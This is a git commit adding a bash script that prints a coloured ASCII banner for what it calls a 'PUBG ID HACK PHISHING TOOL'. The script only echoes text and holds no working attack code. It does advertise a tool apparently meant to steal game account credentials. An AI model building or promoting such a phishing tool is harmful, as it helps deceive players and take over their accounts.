e7129bf2d860858db7796d18797fc503daec6228
Lucifer-MorningStarX <85395042+Lucifer-MorningStarX@users.noreply.github.com>
2021-06-05 18:16:29 +0530

    Add files via upload

---
+++ OnlineHacking/Logo.sh
@@ -0,0 +1,30 @@
+#!/bin/bash
+#clolors
+white='\e[1;37m'
+green='\e[0;32m'
+blue='\e[1;34m'
+red='\e[1;31m'
+yellow='\e[1;33m' 
+echo ""
+banner() {
+echo -e "\e[95m
+ _               _  __           
+| |   _   _  ___(_)/ _| ___ _ __ 
+| |  | | | |/ __| | |_ / _ \ '__|
+| |__| |_| | (__| |  _|  __/ |   
+|_____\__,_|\___|_|_|  \___|_|   
+                               \e[95;1m \e[0m\n"
+  echo""    
+  echo -e $'\e[1;33m\e[0m\e[1;33m    ██████████\e[0m'"\e[96m██████████"'\e[1;33m\e[0m\e[1;31m██████████\e[0m' '\e[1;32m\e[0m\e[1;32m PUBG ID HACK PHISHING TOOL \e[0m''\e[1;37m\e[0m\e[1;37m [v 2.2] \e[0m'                                       
+  echo ""
+   echo -e $'\e[1;33m\e[0m\e[1;33m  [ \e[0m\e[1;32m Follow on Github :- \e[36mhttps://github.com/Lucifer-MorningStarX \e[0m \e[1;32m\e[0m\e[1;33m] \e[0m'
+   echo ""
+      echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+-+ +-+-+-+-+-+-+-+ >>\e[0m'
+      echo -e "\e[93m    PUBG-Phishing"      
+      echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+-+ +-+-+-+-+-+-+-+ >>\e[0m' 
+      echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+ >>\e[0m'
+      echo -e "\e[95m    |L|U|C|F|E|R|"      
+      echo -e $'\e[1;37m\e[0m\e[1;37m    +-+-+-+-+-+ >>\e[0m' 
+      echo ""                                                
+      }
+      banner
